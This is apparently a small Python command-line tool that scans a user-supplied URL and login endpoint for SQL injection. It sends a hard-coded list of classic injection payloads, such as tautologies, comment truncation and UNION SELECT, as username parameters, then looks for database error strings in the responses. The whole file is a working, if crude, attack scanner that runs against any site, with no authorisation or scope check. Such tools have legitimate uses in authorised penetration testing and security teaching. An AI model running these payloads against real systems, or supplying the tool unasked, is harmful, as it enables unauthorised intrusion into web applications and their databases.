import requests
import click
from urllib.parse import urljoin

print("Made By Taylor Christian Newsome / Youtube.com/Stripped")

# Predefined SQL Injection payloads to test
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "admin' --",
    "' UNION SELECT NULL,NULL--",
    "' AND 1=1--",
    "' AND 1=2--"
]

@click.command()
@click.option('--url', prompt='Target URL', help='The base URL of the site to test.')
@click.option('--test-endpoint', prompt='Endpoint to test (e.g. /login)', help='The relative URL endpoint to test for SQLi.')
def sql_injection_tool(url, test_endpoint):
    """SQL Injection Testing Tool."""
    print(f"\nTesting SQL Injection vulnerabilities for: {url}{test_endpoint}\n")

    # Check if the URL is reachable
    if not is_site_reachable(url):
        print(f"Error: Unable to reach {url}")
        return

    # Perform SQL Injection Tests on URL endpoint
    perform_url_sqli_tests(url, test_endpoint)

    print("\nTesting completed.")


def is_site_reachable(url):
    """Check if the given URL is reachable."""
    try:
        response = requests.get(url)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(f"Error reaching the site: {e}")
        return False


def perform_url_sqli_tests(base_url, endpoint):
    """Perform SQL injection tests by sending payloads to the specified URL endpoint."""
    full_url = urljoin(base_url, endpoint)
    print(f"Testing SQL Injection on {full_url}")

    for payload in SQLI_PAYLOADS:
        test_url = f"{full_url}?username={payload}&password=test"
        print(f"Testing payload: {payload}")

        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                if check_vulnerable_response(response.text):
                    print(f"Vulnerable to SQL Injection with payload: {payload}")
                else:
                    print(f"No vulnerability detected with payload: {payload}")
            else:
                print(f"Non-200 response received: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")


def check_vulnerable_response(response_text):
    """Check if the response indicates a SQL injection vulnerability."""
    error_indicators = [
        "you have an error in your SQL syntax",
        "Warning: mysql_fetch_array()",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "SQLSTATE",
        "MySQL",
        "syntax error"
    ]
    
    return any(indicator.lower() in response_text.lower() for indicator in error_indicators)


# Run the script
if __name__ == '__main__':
    sql_injection_tool()
